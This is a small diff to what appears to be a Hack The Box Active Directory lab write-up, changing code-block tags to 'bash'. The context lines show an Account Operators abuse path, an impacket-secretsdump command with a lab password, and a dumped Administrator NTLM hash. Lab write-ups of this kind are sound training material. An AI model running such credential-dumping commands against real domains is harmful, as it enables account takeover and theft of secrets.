@@ -123,7 +123,7 @@ The `Account Operators` group can:
 - Cannot directly modify Domain Admins, but can abuse other paths
 
 ### Attack Path
-```
+```bash
 Account Operators
        │
        ▼
@@ -171,7 +171,7 @@ impacket-secretsdump htb.local/hacker:'Password123!'@10.129.1.248
 ```
 
 Output:
-```
+```bash
 htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
 ```
 
